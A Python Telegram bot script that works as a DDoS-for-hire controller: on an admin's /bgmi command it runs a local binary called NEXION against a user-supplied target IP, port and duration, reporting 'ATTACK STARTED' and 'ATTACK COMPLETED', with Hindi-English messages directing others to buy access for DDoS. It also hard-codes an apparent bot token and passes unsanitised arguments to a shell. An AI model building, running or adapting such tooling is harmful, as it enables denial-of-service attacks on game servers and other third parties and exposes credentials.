from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess

# Replace with your actual bot token
TOKEN = '7534823163:AAEceD0HFpwWwIdst5ff4RhyStZ8CkRtItI'
# Admin ID
ADMIN_ID = 1847934841

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Hello! vip user of t.me/NEXION_OWNER Use /bgmi <target> <port> <time> to run a command.")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text(
            "🚀 Approval ke liye DM yha kro:- @NEXION_OWNER\n"
            "DDOS ke liye File Ke owner Ko DM kre\n"
            "Owner:- t.me/NEXION_OWNER"
        )
        return

    if len(context.args) != 3:
        await update.message.reply_text("✅ Usage: /bgmi <target> <port> <time>")
        return

    target, port, time_duration = context.args

    # Send the attack started message
    await update.message.reply_text(
        f"🔥 ATTACK STARTED 🔥\n\n"
        f"📌 Target: {target}\n"
        f"📌 Port: {port}\n"
        f"📌 Duration: {time_duration} seconds"
    )

    # Format the command to run
    command = f"./NEXION {target} {port} {time_duration}"

    try:
        # Run the command
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        # Suppress error output
        pass

    # Send the attack finished message
    await update.message.reply_text("✅ ATTACK COMPLETED")

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('bgmi', bgmi))

    application.run_polling()

if __name__ == '__main__':
    main()
